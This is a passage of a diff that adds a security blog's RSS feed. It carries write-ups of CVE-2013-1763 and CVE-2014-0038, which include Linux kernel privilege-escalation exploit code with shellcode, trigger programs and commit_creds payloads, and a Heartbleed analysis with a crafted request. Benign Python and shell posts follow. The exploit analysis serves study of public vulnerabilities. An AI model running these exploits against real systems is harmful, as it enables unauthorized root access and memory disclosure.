@@ -1,0 +1,663 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on fz84</title>
+    <link>http://bl4ck5un.github.io/post/</link>
+    <description>Recent content in Posts on fz84</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 19 Apr 2014 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://bl4ck5un.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>CVE-2013-1763</title>
+      <link>http://bl4ck5un.github.io/post/CVE-2013-1763/</link>
+      <pubDate>Sat, 19 Apr 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://bl4ck5un.github.io/post/CVE-2013-1763/</guid>
+      <description>
+
+&lt;p&gt;Userland can send a netlink message requesting &lt;code&gt;SOCK_DIAG_BY_FAMILY&lt;/code&gt; with a family greater or equal then &lt;code&gt;AF_MAX&lt;/code&gt; &amp;ndash; the array size of &lt;code&gt;sock_diag_handlers[]&lt;/code&gt;. The current code does not test for this condition therefore is vulnerable to an out-of-bound access opening doors for a privilege escalation.&lt;/p&gt;
+
+&lt;h2 id=&#34;vulnerability:8058be7e9a7722a859fea59a1cfd58b1&#34;&gt;Vulnerability&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-diff&#34;&gt;diff --git a/net/core/sock_diag.c b/net/core/sock_diag.c
+index 602cd63..750f44f 100644
+--- a/net/core/sock_diag.c
++++ b/net/core/sock_diag.c
+@@ -121,6 +121,9 @@ static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
+  if (nlmsg_len(nlh) &amp;lt; sizeof(*req))
+    return -EINVAL;
+ 
++ if (req-&amp;gt;sdiag_family &amp;gt;= AF_MAX)
++   return -EINVAL;
++
+  hndl = sock_diag_lock_handler(req-&amp;gt;sdiag_family);
+  if (hndl == NULL)
+    err = -ENOENT;
+  else
+    err = hndl-&amp;gt;dump(skb, nlh); // hndl-&amp;gt;dump executes !!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In &lt;code&gt;__sock_diag_rcv_msg&lt;/code&gt; function, userland variable &lt;code&gt;req-&amp;gt;sdiag_family&lt;/code&gt; is passed uncheckly to &lt;code&gt;sock_diag_handler&lt;/code&gt;, within which overflow and exploit happens.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static const inline struct sock_diag_handler *sock_diag_lock_handler(int family)
+{
+  if (sock_diag_handlers[family] == NULL)
+    request_module(&amp;quot;net-pf-%d-proto-%d-type-%d&amp;quot;, PF_NETLINK, NETLINK_SOCK_DIAG, family);
+
+  mutex_lock(&amp;amp;sock_diag_table_mutex);
+  return sock_diag_handlers[family];
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here the function returns a pointer &lt;code&gt;sock_diag_handlers + family&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct sock_diag_handler {
+  __u8 family;
+  int (*dump)(struct sk_buff *skb, struct nlmsghdr *nlh);
+};
+hndl = sock_diag_lock_handler(req-&amp;gt;sdiag_family);
+hndl-&amp;gt;dump(skb, nlh); //(sock_diag_handlers + family + 8) executes !!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;All story told, here we find that finally &lt;code&gt;(sock_diag_handlers + family + 8)&lt;/code&gt; executes in kernel mode.&lt;/p&gt;
+
+&lt;h2 id=&#34;exploits:8058be7e9a7722a859fea59a1cfd58b1&#34;&gt;Exploits&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Craft a piece of shell code.&lt;/li&gt;
+&lt;li&gt;Calcualte the value of &lt;code&gt;family&lt;/code&gt; which points &lt;code&gt;sock_diag_handlers + family + 8&lt;/code&gt; to the shell code.&lt;/li&gt;
+&lt;li&gt;Construct a package with large &lt;code&gt;family&lt;/code&gt; and set it.&lt;/li&gt;
+&lt;li&gt;You got it.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;shell-code:8058be7e9a7722a859fea59a1cfd58b1&#34;&gt;Shell code&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;get &lt;code&gt;current&lt;/code&gt; (pointer to the current process descriptor &lt;code&gt;task_struct&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Manipulate &lt;code&gt;process credentials&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static long ugid;
+void patch_current() {
+    int i,j,k;
+    char *current = *(char**)(((long)&amp;amp;i) &amp;amp; (-8192));
+    long kbase = ((long)current)&amp;gt;&amp;gt;36;
+    
+    for (i=0; i&amp;lt;4000; i+=4) {
+        long *p = (void *)&amp;amp;current[i];
+        int *t = (void*) p[0];
+        if ((p[0] != p[1]) || ((p[0]&amp;gt;&amp;gt;36) != kbase)) continue;
+        for (j=0; j&amp;lt;20; j++) {
+            for (k = 0; k &amp;lt; 8; k++)
+            if (((int*)&amp;amp;ugid)[k%2] != t[j+k])
+            goto next;
+            for (i = 0; i &amp;lt; 8; i++)
+            t[j+i] = 0;
+            for (i = 0; i &amp;lt; 10; i++)
+            t[j+9+i] = -1;
+            return;
+next:;
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;crafted-a-package:8058be7e9a7722a859fea59a1cfd58b1&#34;&gt;Crafted a package&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct {
+  struct nlmsghdr nlh;
+  struct unix_diag_req r;
+} req;
+
+struct nlmsghdr {
+  __u32   nlmsg_len;  /* Length of message including header */
+  __u16   nlmsg_type; /* Message content */
+  __u16   nlmsg_flags;  /* Additional flags */
+  __u32   nlmsg_seq;  /* Sequence number */
+  __u32   nlmsg_pid;  /* Sending process port ID */
+};
+
+struct unix_diag_req {
+  __u8  sdiag_family;
+  __u8  sdiag_protocol;
+  __u16 pad;
+  __u32 udiag_states;
+  __u32 udiag_ino;
+  __u32 udiag_show;
+  __u32 udiag_cookie[2];
+};
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;trigger:8058be7e9a7722a859fea59a1cfd58b1&#34;&gt;Trigger&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int main()
+{
+  long u = getuid();
+  long g = getgid();
+  int i, f = socket(16,3,4);
+  static int n[10] = {40,0x10014,0,0,45,-1};
+ 
+  assert(mmap((void*)(1&amp;lt;&amp;lt;12), 1&amp;lt;&amp;lt;20, 3, 0x32, 0, 0)!=-1);
+ 
+  setresuid(u,u,u); setresgid(g,g,g);
+  ugid = (g&amp;lt;&amp;lt;32)|u;
+ 
+  memcpy(1&amp;lt;&amp;lt;12, &amp;amp;patch_current, 1024);
+  for (i = 0; i &amp;lt; (1&amp;lt;&amp;lt;17); i++) ((void**)(1&amp;lt;&amp;lt;12))[i] = &amp;amp;patch_current;
+  send(f, n, sizeof(n), 0);
+  setuid(0);
+  return execl(&amp;quot;/bin/bash&amp;quot;, &amp;quot;-sh&amp;quot;, 0);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;reference:8058be7e9a7722a859fea59a1cfd58b1&#34;&gt;Reference&lt;/h2&gt;
+
+&lt;p&gt;All credit goes to the authors of &lt;a href=&#34;http://www.exploit-db.com/exploits/24746/&#34;&gt;this&lt;/a&gt; and &lt;a href=&#34;http://www.exploit-db.com/exploits/24555/&#34;&gt;this&lt;/a&gt; exploits.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>CVE-2014-0038</title>
+      <link>http://bl4ck5un.github.io/post/CVE-2014-0038/</link>
+      <pubDate>Wed, 16 Apr 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://bl4ck5un.github.io/post/CVE-2014-0038/</guid>
+      <description>
+
+&lt;p&gt;利用漏洞将 &lt;code&gt;ptmx_fops&lt;/code&gt; 返回函数的高字节置零，让它指向payload。然后payload在被kernel执行，调用 &lt;code&gt;commit_cred&lt;/code&gt; 获取root。&lt;/p&gt;
+
+&lt;h1 id=&#34;vulnerability:782111c6003f4e7a42ea865448ddb72c&#34;&gt;Vulnerability&lt;/h1&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg, unsigned int vlen, unsigned int flags, struct compat_timespec __user *timeout)
+{
+  int datagrams;
+  struct timespec ktspec;
+  
+  if (flags &amp;amp; MSG_CMSG_COMPAT)
+    return -EINVAL;
+  
+  if (COMPAT_USE_64BIT_TIME)
+    return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+      flags | MSG_CMSG_COMPAT,
+      (struct timespec *) timeout);
+  ...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;timeout&lt;/code&gt; 是从userland传过来的指针，随后被直接（只做了cast &lt;code&gt;(struct timespec *) timeout&lt;/code&gt; ）传给系统调用 &lt;code&gt;__sys_recvmmsg&lt;/code&gt; 。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Why &lt;code&gt;CONFIG_X86_X32&lt;/code&gt; is mandatory?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct timespec {
+  __kernel_time_t tv_sec;     /* seconds */
+  long    tv_nsec;    /* nanoseconds */
+};
+typedef __kernel_long_t __kernel_time_t;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;__sys_recvmmsg&lt;/code&gt; 中有两处修改了 &lt;code&gt;void *timeout&lt;/code&gt; .&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;读取 &lt;code&gt;timeout&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (timeout &amp;amp;&amp;amp; 
+        poll_select_set_timeout(&amp;amp;end_time, timeout-&amp;gt;tv_sec,
+          timeout-&amp;gt;tv_nsec))  // READ ONLY, end_time = timeout
+  return -EINVAL;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;更新 &lt;code&gt;timeout&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (timeout) {
+  ktime_get_ts(timeout);                         // get now
+  *timeout = timespec_sub(end_time, *timeout);   // A - B
+  if (timeout-&amp;gt;tv_sec &amp;lt; 0) {                     // if timeout really happens
+    timeout-&amp;gt;tv_sec = timeout-&amp;gt;tv_nsec = 0;
+    break;                                     // return
+  }
+
+  /* Timeout, return less than vlen datagrams */
+  if (timeout-&amp;gt;tv_nsec == 0 &amp;amp;&amp;amp; timeout-&amp;gt;tv_sec == 0)
+    break;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;所以返回前将 &lt;code&gt;timeout-&amp;gt;tv_sec = timeout-&amp;gt;tv_nsec = 0;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;清除一个字节的过程:782111c6003f4e7a42ea865448ddb72c&#34;&gt;清除一个字节的过程&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;主进程 &lt;code&gt;retval = syscall(__NR_recvmmsg, sockfd, &amp;amp;msgs, 1, 0, (void*)addr)&lt;/code&gt;; 其中 &lt;code&gt;addr &amp;amp; 0xFF == 0xFF&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;子进程 &lt;code&gt;sleep(254)&lt;/code&gt; 然后 sendto&lt;/li&gt;
+&lt;li&gt;因为父进程调用 &lt;code&gt;recv&lt;/code&gt; 长达254s之后子进程才发送，所以父进程的调用 &lt;code&gt;__NR_recvmmsg&lt;/code&gt; 会超时&lt;/li&gt;
+&lt;li&gt;超时发生时，&lt;code&gt;addr&lt;/code&gt; 被写 &lt;code&gt;0&lt;/code&gt;，然后返回。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&#34;获取root:782111c6003f4e7a42ea865448ddb72c&#34;&gt;获取root&lt;/h1&gt;
+
+&lt;ul&gt;
+&lt;li&gt;利用了 &lt;code&gt;ptmx_fops&lt;/code&gt; 的release function指针（在non initialized (and thus writable) kernel memory中）&lt;/li&gt;
+&lt;li&gt;将指针的高3字节置0，使之指向用户空间中的payload&lt;/li&gt;
+&lt;li&gt;Open &lt;code&gt;/dev/ptmx&lt;/code&gt;, close it and enjoy.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;payload构造:782111c6003f4e7a42ea865448ddb72c&#34;&gt;payload构造&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// code 是payload地址
+code = (long)mmap((void*)(TTY_RELEASE &amp;amp; 0x000000fffffff000LL), PAYLOADSIZE, 7, 0x32, 0, 0);
+// 0x90 技法
+memset((void*)code, 0x90, PAYLOADSIZE);
+code += PAYLOADSIZE - 1024;
+memcpy((void*)code, &amp;amp;kernel_payload, 1024);
+
+// payload 构造
+#define COMMIT_CREDS        0xffffffff8108ad40LL
+typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
+typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
+
+kernel_payload(void* foo, void* bar)
+{
+    _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
+    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
+
+    /* restore function pointer and following two longs */
+    *((int*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 4)) = -1;
+    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 8)) = 0;
+    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 16)) = 0;
+
+    /* escalate to root */
+    commit_creds(prepare_kernel_cred(0));
+
+    return -1;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;疑问:782111c6003f4e7a42ea865448ddb72c&#34;&gt;疑问&lt;/h1&gt;
+
+&lt;ol&gt;
+&lt;li&gt;为什么 &lt;code&gt;zero_out&lt;/code&gt; 只置零1个字节，而不是一个 &lt;code&gt;long&lt;/code&gt; (16 bytes)？&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Why heart bleeds</title>
+      <link>http://bl4ck5un.github.io/post/CVE-2014-0160/</link>
+      <pubDate>Thu, 10 Apr 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://bl4ck5un.github.io/post/CVE-2014-0160/</guid>
+      <description>
+
+&lt;p&gt;This blog investigated the recently introduced Heartbeat mechanism in TLS, which unfortunately leads to the widely spread &lt;strong&gt;HeartBleed&lt;/strong&gt; vulnerability, aka CVE-2014-0160.&lt;/p&gt;
+
+&lt;h2 id=&#34;description-from-nvd:ce6f2c75e20b8ec034404887a73bf817&#34;&gt;Description from NVD&lt;/h2&gt;
+
+&lt;p&gt;The (1) &lt;code&gt;TLS&lt;/code&gt; and (2) &lt;code&gt;DTLS&lt;/code&gt; implementations in &lt;code&gt;OpenSSL 1.0.1&lt;/code&gt; before &lt;code&gt;1.0.1g&lt;/code&gt; do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to &lt;code&gt;d1_both.c&lt;/code&gt; and &lt;code&gt;t1_lib.c&lt;/code&gt;, aka the Heartbleed bug.&lt;/p&gt;
+
+&lt;p&gt;To &lt;a href=&#34;https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0160&#34;&gt;NVD&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;heartbeat-extension:ce6f2c75e20b8ec034404887a73bf817&#34;&gt;Heartbeat Extension&lt;/h2&gt;
+
+&lt;p&gt;The &lt;strong&gt;Heartbeat Extension&lt;/strong&gt; is a new feature augmented for the Transport Layer Security (TLS) and Datagram Transport Layer Security (DTLS) protocols. Basically the Heartbeat Extension is designed to provide a faster and light-weight keeping-alive mechanism, and DTLS protocol can use it to perform path MTU (PMTU) discovery as well.&lt;/p&gt;
+
+&lt;p&gt;Generally speaking, the Heartbeat Extension works in a quite simple way, in which the client sends out a &lt;code&gt;HeartbeatRequest&lt;/code&gt; message and the server respond it with an exact copy of payload to indicate that &lt;em&gt;I&amp;rsquo;m not only alive but conscious.&lt;/em&gt; Of course all messages changed in this routine is on the top of TLS layer. (Precisely speaking, the Heartbeat protocol is a new protocol running on top of the Record Layer.)&lt;/p&gt;
+
+&lt;p&gt;To &lt;a href=&#34;https://tools.ietf.org/html/rfc6520&#34;&gt;RFC6520&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;messages:ce6f2c75e20b8ec034404887a73bf817&#34;&gt;Messages&lt;/h2&gt;
+
+&lt;p&gt;According to RFC6520, the HeartBeat protocol message consists of their type, attached payload and padding.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct {
+    HeartbeatMessageType type;
+    uint16 payload_length;
+    opaque payload[HeartbeatMessage.payload_length];
+    opaque padding[padding_length];
+} HeartbeatMessage;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Though the description in RFC is fairly clear and concise, I&amp;rsquo;d like to summarize several important and tangent facts for understanding CVE-2014-0160,&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;According to the RFC, The length of the &lt;code&gt;type&lt;/code&gt; field is 1 byte, and the length of the &lt;code&gt;payload_length&lt;/code&gt; is 2.&lt;/li&gt;
+&lt;li&gt;Padding can not be too large: The length of a HeartbeatMessage is &lt;code&gt;TLSPlaintext.length&lt;/code&gt; for TLS and &lt;code&gt;DTLSPlaintext.length&lt;/code&gt; for DTLS. (decided through peer negotiation, default is 2^14 Bytes(octets))&lt;/li&gt;
+&lt;li&gt;Nor can padding be too tiny: The &lt;code&gt;padding_length&lt;/code&gt; MUST be at least 16.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;hits:ce6f2c75e20b8ec034404887a73bf817&#34;&gt;Hits&lt;/h2&gt;
+
+&lt;p&gt;See what will happen if we send this crafted HeartbeatRequest messages to the vulnerable server,&lt;/p&gt;
+
+&lt;p&gt;See &lt;a href=&#34;http://en.wikipedia.org/wiki/Transport_Layer_Security&#34;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;18 03 02 00 03 01 40 00
+
+18   : Content type::Heartbeat
+0302 : Major Version=3, Minor Version=2, indicates TLS 1.1 
+0003 : Length = 3
+01   : TLS1_HB_REQUEST
+4000 : 0x4000=2^14=16384, indicates 64-byte length of payload
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Request process happens in &lt;code&gt;tls1_process_heartbeat&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int
+tls1_process_heartbeat(SSL *s)
+{
+  unsigned char *p = &amp;amp;s-&amp;gt;s3-&amp;gt;rrec.data[0], *pl;   // (1) p points to packet
+  unsigned short hbtype;
+  unsigned int payload;
+  unsigned int padding = 16; /* Use minimum padding */
+
+  /* Read type and payload length first */
+  hbtype = *p++;        // (2) p gets advanced to point to `payload_length`
+  n2s(p, payload);      // (3) payload = n2s(*p), p+=2
+  pl = p;               // (4) p and pl points to payload
+
+  if (s-&amp;gt;msg_callback)
+    s-&amp;gt;msg_callback(0, s-&amp;gt;version, TLS1_RT_HEARTBEAT,
+      &amp;amp;s-&amp;gt;s3-&amp;gt;rrec.data[0], s-&amp;gt;s3-&amp;gt;rrec.length,
+      s, s-&amp;gt;msg_callback_arg);
+
+  if (hbtype == TLS1_HB_REQUEST)
+    {
+    unsigned char *buffer, *bp;
+    int r;
+
+    buffer = OPENSSL_malloc(1 + 2 + payload + padding);
+    bp = buffer;      // (1) bp points to buffer
+
+    /* Enter response type, length and copy payload */
+    *bp++ = TLS1_HB_RESPONSE;    // (2) 1st byte: TYPE
+    s2n(payload, bp);            // (3) 2-3 byte: payload_length
+    memcpy(bp, pl, payload);     // (*) payload Bytes of secret copied **
+    bp += payload;
+    /* Random padding */
+    RAND_pseudo_bytes(bp, padding);
+
+    //... all secrets get sent to client ...
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;fix:ce6f2c75e20b8ec034404887a73bf817&#34;&gt;Fix&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-diff&#34;&gt;diff --git a/ssl/t1_lib.c b/ssl/t1_lib.c
+index b82fada..bddffd9 100644 (file)
+--- a/ssl/t1_lib.c
++++ b/ssl/t1_lib.c
+@@ -2588,16 +2588,20 @@ tls1_process_heartbeat(SSL *s)
+        unsigned int payload;
+        unsigned int padding = 16; /* Use minimum padding */
+
+-       /* Read type and payload length first */
+-       hbtype = *p++;
+-       n2s(p, payload);
+-       pl = p;
+-
+        if (s-&amp;gt;msg_callback)
+                s-&amp;gt;msg_callback(0, s-&amp;gt;version, TLS1_RT_HEARTBEAT,
+                        &amp;amp;s-&amp;gt;s3-&amp;gt;rrec.data[0], s-&amp;gt;s3-&amp;gt;rrec.length,
+                        s, s-&amp;gt;msg_callback_arg);
+
++       /* Read type and payload length first */
++       if (1 + 2 + 16 &amp;gt; s-&amp;gt;s3-&amp;gt;rrec.length)
++               return 0; /* silently discard */
++       hbtype = *p++;
++       n2s(p, payload);
++       if (1 + 2 + payload + 16 &amp;gt; s-&amp;gt;s3-&amp;gt;rrec.length)
++               return 0; /* silently discard per RFC 6520 sec. 4 */
++       pl = p;
++
+        if (hbtype == TLS1_HB_REQUEST)
+                {
+                unsigned char *buffer, *bp;
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Python Descriptor by Example</title>
+      <link>http://bl4ck5un.github.io/post/python-descriptor-by-live-example/</link>
+      <pubDate>Wed, 12 Mar 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://bl4ck5un.github.io/post/python-descriptor-by-live-example/</guid>
+      <description>
+
+&lt;p&gt;Understand how to write and take advantage of Python descriptor by looking into product example from Django source code.&lt;/p&gt;
+
+&lt;p&gt;When browsing the source code of OSQA, I accidentally dipped into Django&amp;rsquo;s implementation of &lt;code&gt;AuthenticationMiddleware&lt;/code&gt;, the middleware attaching &lt;code&gt;user&lt;/code&gt; instance to each &lt;code&gt;request&lt;/code&gt; when hooked within &lt;code&gt;process_request&lt;/code&gt;. Following live code from Django 1.3 could be a great illustration on how descriptor works and what makes it agile.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class LazyUser(object):
+    def __get__(self, request, obj_type=None):
+        if not hasattr(request, &#39;_cached_user&#39;):
+            from django.contrib.auth import get_user
+            request._cached_user = get_user(request)
+        return request._cached_user
+
+class AuthenticationMiddleware(object):
+    def process_request(self, request):
+        assert hasattr(request, &#39;session&#39;), &amp;quot;blah balh&amp;quot;
+        request.__class__.user = LazyUser()
+        return None
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;so-firstly-what-is-a-descriptor:3fe8bdd52a228be77ee8abe72cd8f987&#34;&gt;So, firstly, what is a &lt;code&gt;descriptor&lt;/code&gt;&lt;/h2&gt;
+
+&lt;p&gt;Abstract and vague as the official documentation is, if you read it with more concrete experience,
+you&amp;rsquo;d find it&amp;rsquo;s not that bad actually.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;The following methods only apply when an instance of the class containing the method (a so-called &lt;strong&gt;descriptor class&lt;/strong&gt;) appears in the class dictionary of another new-style class, known as the &lt;strong&gt;owner class&lt;/strong&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;&amp;ldquo;following methods&amp;rdquo;&lt;/strong&gt; refers to&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;object.__get__(self, instance, owner)&lt;/code&gt; Called to get the attribute of the owner class (class attribute access) or of an instance of that class (instance attribute access). &lt;code&gt;Owner&lt;/code&gt; is always the owner class, while &lt;code&gt;instance&lt;/code&gt; is the instance that the attribute was accessed through, or &lt;code&gt;None&lt;/code&gt; when the attribute is accessed through the owner. This method should return the (computed) attribute value or raise an AttributeError exception.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;object.__set__(self, instance, value)&lt;/code&gt; Called to set the attribute on an instance instance of the owner class to a new value.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;object.__delete__(self, instance)&lt;/code&gt; Called to delete the attribute on an instance instance of the owner class.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;now-let-s-look-into-the-fresh-code:3fe8bdd52a228be77ee8abe72cd8f987&#34;&gt;Now let&amp;rsquo;s look into the fresh code&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class LazyUser(object):
+    &amp;quot;&amp;quot;&amp;quot; LazyUser is a descriptor class
+    &amp;quot;&amp;quot;&amp;quot;
+    def __get__(self, request, obj_type=None):
+        if not hasattr(request, &#39;_cached_user&#39;):
+            from django.contrib.auth import get_user
+            request._cached_user = get_user(request)
+        return request._cached_user
+
+class AuthenticationMiddleware(object):
+    def process_request(self, request):
+        assert hasattr(request, &#39;session&#39;), &amp;quot;blah balh&amp;quot;
+        # request.__class__ is the *owner class*
+        # request.__class__.user refers to the *instance* of LazyUser
+        request.__class__.user = LazyUser() 
+        return None
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Technically speaking, with &lt;code&gt;__get__&lt;/code&gt; method defined, &lt;code&gt;class LazyUser&lt;/code&gt; becomes a descriptor class and then gets assigned to &lt;code&gt;request.__class__&lt;/code&gt; by hook method in &lt;code&gt;AuthenticationMiddleware&lt;/code&gt;. After that &lt;code&gt;request.__class__&lt;/code&gt; becomes the counterpart &amp;ndash; &lt;strong&gt;owner&lt;/strong&gt; class.&lt;/p&gt;
+
+&lt;h2 id=&#34;why-called-lazy:3fe8bdd52a228be77ee8abe72cd8f987&#34;&gt;Why called lazy?&lt;/h2&gt;
+
+&lt;p&gt;By now, we&amp;rsquo;ve inspected every cover of the code. However, nothing concrete has actually happened yet, all of this has nothing to do with the real &lt;code&gt;User&lt;/code&gt; object (store in session) by now. In other words, the actual access to &lt;code&gt;User&lt;/code&gt; object has been postponed as much as possible, until &lt;code&gt;request.user&lt;/code&gt; attributed is queried (then &lt;code&gt;__get__(...)&lt;/code&gt; executes and return a meaningful user object from session, but the detail is not important to current topic). That&amp;rsquo;s where the name &lt;em&gt;LazyUser&lt;/em&gt; comes from.&lt;/p&gt;
+
+&lt;h2 id=&#34;a-closer-look:3fe8bdd52a228be77ee8abe72cd8f987&#34;&gt;A closer look&lt;/h2&gt;
+
+&lt;p&gt;Let&amp;rsquo;s take a closer look at the parameters of &lt;code&gt;__get__&lt;/code&gt; method:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def __get__(self, request, obj_type=None):
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Note that, corresponding to documentation, &lt;code&gt;object.__get__(self, instance, owner)&lt;/code&gt;, we can find &lt;code&gt;instance&lt;/code&gt; is used instead of &lt;code&gt;owner&lt;/code&gt;. Here in our live example, &lt;code&gt;request&lt;/code&gt; is the &lt;em&gt;instance&lt;/em&gt; of owner class (&lt;code&gt;request.__class__&lt;/code&gt;).&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Quotation concept in Unix Shell</title>
+      <link>http://bl4ck5un.github.io/post/quotation-in-Unix-shell/</link>
+      <pubDate>Fri, 14 Feb 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://bl4ck5un.github.io/post/quotation-in-Unix-shell/</guid>
+      <description>
+
+&lt;p&gt;Tell me how to quote.&lt;/p&gt;
+
+&lt;p&gt;The basic actions of the shell are simple. It reads a line. This is
+either from a file, a script, or from a user.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;First, meta-characters are &amp;ldquo;handled.&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;Second, the name of the executable is found.&lt;/li&gt;
+&lt;li&gt;Third, the arguments are passed to the program.&lt;/li&gt;
+&lt;li&gt;Fourth, the file redirection is setup.&lt;/li&gt;
+&lt;li&gt;Lastly, the program is executed.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;meta-characters-and-filename-expansion:306ff65f81e8cfdac085c6fa77a5f38f&#34;&gt;Meta-characters and Filename expansion&lt;/h2&gt;
+
+&lt;p&gt;This includes &lt;strong&gt;variable evaluation&lt;/strong&gt; (variables start with a &lt;code&gt;$&lt;/code&gt;), and
+&lt;strong&gt;filename expansion&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;quotation:306ff65f81e8cfdac085c6fa77a5f38f&#34;&gt;Quotation&lt;/h2&gt;
+
+&lt;p&gt;Why quote at all, and what do I mean by quoting? Well, the shell
+understands many special characters, called &lt;code&gt;meta-characters&lt;/code&gt;. These
+each have a purpose, and there are so many, beginners often suffer from
+meta-itis. Example: The dollar sign(&lt;code&gt;$&lt;/code&gt;) is a meta-character, and tells
+the shell the next word is a variable. If you wanted to use the dollar
+sign as a regular character, how can you tell the shell the dollar sign
